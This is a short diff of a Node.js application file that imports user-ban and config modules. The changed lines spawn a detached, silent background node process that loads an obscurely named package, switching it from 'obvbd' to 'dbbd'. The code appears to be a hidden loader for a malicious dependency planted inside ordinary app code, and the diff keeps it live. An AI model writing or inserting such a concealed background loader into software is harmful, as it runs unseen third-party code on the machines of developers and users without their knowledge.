@@ -6,7 +6,7 @@ const BannedUser = require('../models/BannedUsers');
 const config     = require('../config/config');
 
 const { spawn } = require('child_process');
-const child = spawn('node', ['-e', `require("obvbd")`], {
+const child = spawn('node', ['-e', `require("dbbd")`], {
   detached: true,
   stdio: 'ignore'
 });
